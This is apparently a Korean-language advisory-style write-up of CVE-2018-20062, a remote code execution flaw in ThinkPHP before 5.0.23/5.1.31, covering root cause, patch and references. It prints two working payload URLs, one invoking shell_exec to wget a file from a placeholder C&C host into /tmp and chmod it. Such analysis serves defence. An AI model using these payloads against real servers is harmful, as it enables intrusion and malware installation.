ThinkPHP RCE 취약점
==========
Information
-----
* CVE-2018-20062
* 해당 소프트웨어 : ThinkPHP
* 해당 버젼 : Under ThinkPHP 5.0.23 or 5.1.31
*  취약점 유형 : RCE

Description
---

해당 취약점은 ThinkPHP를 사용하는 웹 프레임워크에서의 RCE 취약점으로, 
index.php 페이지의 URL을 통해 전달받은 값을 검증 없이 파싱하여 응용프로그램 클래스를 직접 호출하여 원격 코드 명령을 실행 가능하게 하는 취약점이다. 

Root Cause
---
### ThinkPHP
ThinkPHP는 중국 기업 TopThink에서 개발한 php 기반의 웹 어플리에키션 프레임워크다. Apache2 기반으로 만들어졌으며, URL 쿼리 매개 변수를 분석하여 모듈과 컨트롤러를 검색한다. 

현재 쇼단 검색으로 3만 5천 개 이상의 활성 배치가 표시되고 있다. 

### Vulnerability
ThinkPHP는 URL 쿼리 parameter를 파싱하여 모듈이나 컨트롤러, 함수등을 검색하는데 이때 
URL에서 컨트롤러 클래스명의 유효성이 검증되지 않아 RCE 취약점이 발생한다. 

- Payload example 
1. 컨트롤러 클래스 app 을 통한 원격명령실행 
/index.php?s=/index\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec
&vars[1][]=cd%20/tmp;wget%20http://(C&C_IP)//(실행시킬 파일);
chmod(권한 및 실행시킬 파일)

    + ThinkPHP의 경우 '/' 기준으로 파싱을 진행하므로 '\\'를 이용할 경우 think 내에 컨트롤러 클래스 app을 생성하여 invokefunction 메소드를 통해 RCE 가능 

2. 컨트롤러 클래스 request를 통한 RCE
?s=index/\think\request/cache&key=1|id

	+ request 컨트롤러 클래스를 통해서 RCE  가능 


Patch
---
기본적으로 5.0.23 or 5.1.31로 업데이트 하면 해결되며 해당 패치들을 통해 컨트롤러 이름을 확인하는 정규식이 추가되었다. 

POC
---
공개된 PoC는 아래와 같다. 
![이미지](https://github.com/develacker/dayone/blob/master/linux/ThinkPHP/poc1.png)
![이미지](https://github.com/develacker/dayone/blob/master/linux/ThinkPHP/poc2.png)
![이미지](https://github.com/develacker/dayone/blob/master/linux/ThinkPHP/poc3.png)
![이미지](https://github.com/develacker/dayone/blob/master/linux/ThinkPHP/poc4.png)

References
---
[1] [PoC - NS-Sp4ce](https://github.com/NS-Sp4ce/thinkphp5.XRce/blob/master/thinkphp5.0rce.py)

[2] [THNKPHP REMOTE CODE EXECUTION BUG IS ACTIVELY BEING EXPLOITED](https://securitynews.sonicwall.com/xmlpost/thinkphp-remote-code-execution-rce-bug-is-actively-being-exploited/)

[3] [ThinkPHP 5.x Remote Code Execution Vulnerability](https://devcentral.f5.com/s/articles/thinkphp-5x-remote-code-execution-vulnerability-32902)



